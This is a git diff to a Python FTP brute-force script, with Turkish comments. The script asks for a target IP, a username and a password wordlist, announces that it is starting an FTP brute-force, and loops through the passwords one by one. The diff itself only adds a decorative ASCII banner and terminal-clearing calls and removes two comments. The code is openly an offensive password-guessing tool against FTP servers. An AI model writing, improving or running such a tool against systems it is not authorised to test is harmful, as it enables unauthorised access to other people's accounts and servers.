@@ -1,5 +1,18 @@
 import ftplib
 import time
+import os
+
+# Terminali temizle
+os.system("clear")
+
+# ASCII banner
+print(r"""
+  ___                           
+ | _ ) __ _ _ _  __ _ _ _  __ _ 
+ | _ \/ _` | ' \/ _` | ' \/ _` |
+ |___/\__,_|_||_\__,_|_||_\__,_|
+                                  
+""")
 
 print("🔒 Target IP:")
 target = input("> ")
@@ -12,7 +25,6 @@ if username == "":
 print("📁 Password list file (example: passlist.txt):")
 wordlist_path = input("> ").strip()
 
-# Şifre listesini oku
 try:
     with open(wordlist_path, "r", encoding="latin-1") as file:
         passwords = file.readlines()
@@ -20,9 +32,9 @@ except FileNotFoundError:
     print("❌ Password list not found.")
     exit()
 
+os.system("clear")
 print(f"\n🚀 Starting FTP brute-force on {target} as {username}...\n")
 
-# Şifreleri sırayla dene
 for password in passwords:
     password = password.strip()
     print(f"🔍 Trying password: {password}")
